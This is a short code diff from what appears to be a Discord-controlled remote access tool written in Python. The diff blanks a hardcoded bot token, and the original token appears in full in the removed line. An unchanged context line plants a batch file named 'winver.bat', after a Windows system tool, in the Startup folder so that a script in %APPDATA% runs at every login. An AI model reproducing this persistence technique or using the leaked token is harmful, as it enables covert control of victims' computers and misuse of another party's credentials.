@@ -12,7 +12,7 @@ from win32com.shell import shell, shellcon
 
 
 
-token = "MTExNTY3MTU2MDY5NTU3ODc2NA.G1NVY2.yxUk-pTFQKB6Vy5GFUnIK1lYMq0FfEEEcOuzAk"
+token = ""
 your_server_id=000000000
 
 open(f'{shell.SHGetFolderPath(0, (shellcon.CSIDL_STARTUP, shellcon.CSIDL_COMMON_STARTUP)[0], None, 0)}\\winver.bat', "w").write(f"@echo off\npy {os.getenv('appdata')}\\r.py")
